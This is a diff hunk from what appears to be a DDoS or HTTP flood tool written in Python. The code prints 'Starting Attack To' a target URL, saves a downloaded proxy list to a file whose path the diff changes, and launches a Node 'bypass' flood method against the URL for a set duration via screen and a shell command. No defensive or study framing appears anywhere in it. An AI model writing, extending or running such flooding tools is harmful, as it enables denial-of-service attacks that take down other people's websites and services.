@@ -103,7 +103,7 @@ class Home:
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
 						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
 						time.sleep(0.01)
-					with open("vdh/http.txt", 'w') as p:
+					with open("/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node vdh/Method/bypass {url} {floodtime}'], shell=True)
 				except:
